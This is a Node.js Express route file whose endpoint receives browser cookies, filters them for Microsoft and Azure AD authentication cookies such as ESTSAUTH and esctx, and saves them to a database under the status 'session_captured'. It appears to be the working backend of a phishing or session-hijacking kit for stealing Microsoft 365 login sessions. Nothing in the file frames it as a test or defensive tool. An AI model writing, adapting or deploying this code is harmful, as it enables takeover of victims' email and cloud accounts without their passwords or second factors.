const express = require('express');
const User = require('../models/user');

const router = express.Router();

// Endpoint for browser to send cookies after successful auth
router.post('/submit/:userId', async (req, res) => {
  try {
    const { userId } = req.params;
    const { cookies } = req.body;
    
    if (!cookies || !Array.isArray(cookies)) {
      return res.status(400).json({ error: 'Invalid cookies data' });
    }
    
    console.log(`🍪 Received ${cookies.length} cookies from browser for user ${userId}`);
    
    // Filter for authentication cookies
    const authCookies = cookies.filter(cookie => {
      const authNames = [
        'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
        'buid', 'esctx', 'fpc', 'x-ms-gateway-slice',
        'stsservicecookie', 'AADSSO', 'wlidperf', 'ClientId',
        'msal.cache.encryption'
      ];
      
      return authNames.includes(cookie.name) || 
             cookie.name.startsWith('esctx-') ||
             cookie.domain.includes('microsoft') ||
             cookie.domain.includes('outlook') ||
             cookie.domain.includes('login.live.com');
    });
    
    console.log(`🔑 Filtered to ${authCookies.length} authentication cookies`);
    
    // Save to database
    await User.findByIdAndUpdate(userId, {
      sessionCookies: authCookies,
      allCookies: authCookies,
      cookieStatus: "session_captured",
      isActive: true,
      lastLogin: new Date()
    });
    
    console.log(`💾 Saved cookies for user ${userId}`);
    res.json({ success: true, cookieCount: authCookies.length });
    
  } catch (error) {
    console.error('Error saving session cookies:', error);
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;